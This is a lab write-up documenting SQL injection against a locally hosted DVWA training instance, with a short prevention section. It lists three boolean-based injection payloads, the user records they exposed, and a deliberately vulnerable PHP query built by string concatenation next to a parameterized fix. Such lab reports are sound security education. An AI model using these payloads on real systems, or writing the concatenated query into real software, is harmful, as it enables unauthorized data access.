SQL Injection Demonstration – DVWA
Overview

This project demonstrates a classic SQL Injection vulnerability using Damn Vulnerable Web Application (DVWA) running locally.

The exercise was performed in a controlled laboratory environment using DVWA with the security level set to Low.

Ethical Notice: All testing was performed only against DVWA running on a local machine. No real websites, applications, or third-party systems were tested.

Objective

The objectives of this task were to:

Install and configure DVWA locally.
Configure DVWA to use the Low security level.
Navigate to the SQL Injection module.
Demonstrate SQL Injection using multiple test payloads.
Observe and document the information returned by the vulnerable application.
Explain why the SQL Injection worked.
Explain how developers can prevent SQL Injection.
Tools Used
DVWA
XAMPP
Apache
MySQL/MariaDB
PHP
Web browser
Environment

The application was hosted locally using XAMPP.

Example local URL:

http://localhost/dvwa/

The DVWA security level was configured as:

Low
DVWA Setup
Installed XAMPP.
Started Apache and MySQL.
Downloaded DVWA.
Placed the DVWA directory inside the XAMPP htdocs directory.
Configured the DVWA database settings.
Opened the DVWA setup page.
Created/reset the DVWA database.
Logged into DVWA.
Set the security level to Low.
SQL Injection

SQL Injection is a web application vulnerability that occurs when an application includes untrusted user input directly in an SQL query.

Instead of treating the input only as data, the database may interpret specially crafted input as part of the SQL command.

A simplified vulnerable query may look like:

SELECT * FROM users WHERE user_id = '$id';

If $id contains malicious SQL syntax, the input can interfere with the intended query.

Baseline Test

Before testing SQL Injection, the application was tested using a normal user ID:

1

This was used to establish the normal behavior of the application.

Result

The application returned the normal user record associated with the supplied ID.

Screenshot:

[Insert Screenshot 2 Here]
SQL Injection Test 1

Payload:

' OR '1'='1

The expression:

'1'='1'

evaluates to TRUE.

This can change the logic of the application's SQL query and cause it to return more records than intended.

Observed Result

SQL Injection using payload 1 was successful, and the admin account, Gordon Brown account, Hack Me account, Pablo Picasso account, Bob Smith account data was retrieved.

Data Exposed

ID: ' OR '1'='1,
First name: admin, 
Surname: admin

ID: ' OR '1'='1,
First name: Gordon, 
Surname: Brown

ID: ' OR '1'='1,
First name: Hack, 
Surname: Me

ID: ' OR '1'='1,
First name: Pablo, 
Surname: Picasso

ID: ' OR '1'='1,
First name: Bob, 
Surname: Smith

Screenshot:

[Insert Screenshot 3 Here]

SQL Injection Test 2

Payload:

1' OR '1'='1

This payload was used to perform another Boolean-based SQL Injection test.

Observed Result

SQL Injection using payload 2 was successful, and the admin account, Gordon Brown account, Hack Me account, Pablo Picasso account, Bob Smith account data was retrieved.

Data Exposed

ID: 1' OR '1'='1,
First name: admin, 
Surname: admin

ID: 1' OR '1'='1,
First name: Gordon, 
Surname: Brown

ID: 1' OR '1'='1,
First name: Hack, 
Surname: Me

ID: 1' OR '1'='1,
First name: Pablo, 
Surname: Picasso

ID: 1' OR '1'='1,
First name: Bob, 
Surname: Smith

Screenshot:

[Insert Screenshot 4 Here]

SQL Injection Test 3

Payload:

1' OR '1'='1' -- 

The -- can be used as an SQL comment marker in MySQL-compatible SQL syntax.

Observed Result

SQL Injection using payload 3 was successful, and the admin account, Gordon Brown account, Hack Me account, Pablo Picasso account, Bob Smith account data was retrieved.

Data Exposed


ID: 1' OR '1'='1 --,
First name: admin, 
Surname: admin

ID: 1' OR '1'='1 --,
First name: Gordon, 
Surname: Brown

ID: 1' OR '1'='1 --,
First name: Hack, 
Surname: Me

ID: 1' OR '1'='1 --,
First name: Pablo, 
Surname: Picasso

ID: 1' OR '1'='1 --,
First name: Bob, 
Surname: Smith

Screenshot:

[Insert Screenshot 5 Here]

Results Summary

Test	Payload	Result

Baseline	1	Normal user record
Test 1	' OR '1'='1	SQL Injection using payload 1 was successful, and the admin account, Gordon Brown account, Hack Me account, Pablo Picasso account, Bob Smith account data was retrieved.
Test 2	1' OR '1'='1	SQL Injection using payload 2 was successful, and the admin account, Gordon Brown account, Hack Me account, Pablo Picasso account, Bob Smith account data was retrieved.
Test 3	1' OR '1'='1' --	SQL Injection using payload 3 was successful, and the admin account, Gordon Brown account, Hack Me account, Pablo Picasso account, Bob Smith account data was retrieved.

Why the Payload Works

The vulnerability occurs because user input is incorporated directly into an SQL statement.

A vulnerable application may construct a query similar to:

$query = "SELECT * FROM users WHERE user_id = '$id'";

The database cannot reliably distinguish between the application's SQL code and malicious SQL syntax supplied through the input field.

The Boolean expression:

'1'='1'

is always true. Therefore, the injected condition can alter the logic of the WHERE clause.

Security Impact

SQL Injection can allow an attacker to interfere with database queries.

Depending on the vulnerable application and database permissions, SQL Injection can potentially result in:

Unauthorized data disclosure
Authentication bypass
Modification of database records
Deletion of data
Privilege escalation
Further compromise of an application or server

In this DVWA exercise, the demonstrated impact was the exposure of database records returned by the SQL Injection module.

Prevention

The primary defense against SQL Injection is to use parameterized queries, also known as prepared statements.

Instead of constructing SQL using string concatenation:

$query = "SELECT * FROM users WHERE user_id = '$id'";

a developer should use a parameterized query:

$stmt = $db->prepare(
    "SELECT * FROM users WHERE user_id = ?"
);

$stmt->execute([$id]);

The SQL structure and user-provided value are handled separately.

Additional security measures include:

Validate input.
Use least-privilege database accounts.
Avoid unnecessary dynamic SQL.
Do not expose sensitive database errors to users.
Perform regular security testing.
Keep application dependencies and database software updated.
Conclusion

This exercise demonstrated how SQL Injection can manipulate a vulnerable database query when user input is incorporated directly into SQL.

The DVWA Low security level intentionally provides an insecure environment in which the vulnerability can be observed.

The key lesson for developers is that user input should never be allowed to alter the structure of an SQL query. Parameterized queries and prepared statements should be used to separate SQL commands from user-supplied data.

References
DVWA – Damn Vulnerable Web Application
https://github.com/digininja/DVWA
PortSwigger Web Security Academy – SQL Injection
https://portswigger.net/web-security/sql-injection
